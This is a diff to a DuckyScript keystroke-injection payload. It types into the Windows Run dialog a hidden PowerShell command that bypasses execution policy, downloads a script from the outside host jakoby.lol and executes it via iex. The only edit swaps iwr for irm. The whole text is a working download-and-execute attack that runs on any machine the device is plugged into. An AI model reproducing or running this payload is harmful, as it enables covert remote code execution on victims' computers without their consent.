@@ -12,5 +12,5 @@ REM     ------------------------------------------------------------------------
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass iwr jakoby.lol/yzb | iex
+STRING powershell -w h -NoP -NonI -Ep Bypass irm jakoby.lol/yzb | iex
 ENTER
